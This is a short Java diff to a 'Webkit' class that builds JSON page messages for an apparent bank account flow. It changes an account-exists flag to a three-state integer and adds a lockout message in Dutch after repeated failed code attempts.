@@ -36,21 +36,26 @@ public class Webkit
     	objSender.sendObject(j);
     }
     
-    public void sendAccExist(boolean accountExist)
+    public void sendAccExist(int accountExist)
     {
         accExist = new JSONObject();
-        if (accountExist)
+        if (accountExist == 2)
         {
-            accExist.put("page", "code");
+            accExist.put("page", "select");
         }
-        else 
+        else if(accountExist == 0)
         {
             accExist.put("page", "finish");
             accExist.put("failed", 1);
             accExist.put("message", "Account bestaat niet of is geblokkeerd, probeert u het later nog eens of neem contact op met de bank.");
         }
-        objSender.sendObject(accExist);
+        
+        if(accountExist != 1) 
+        {
+        	objSender.sendObject(accExist);
+        }
     }
+    
 	public void sendAccBlock(boolean accBlocked)
 	{
 		accBlock = new JSONObject();
@@ -90,6 +95,9 @@ public class Webkit
     {
         failCountObj = new JSONObject();
         failCountObj.put("page", "code");
+        if(failcount > 2) {
+        	sendAccExist(0);
+        }
         failCountObj.put("failCount", failcount);
         objSender.sendObject(failCountObj);
             
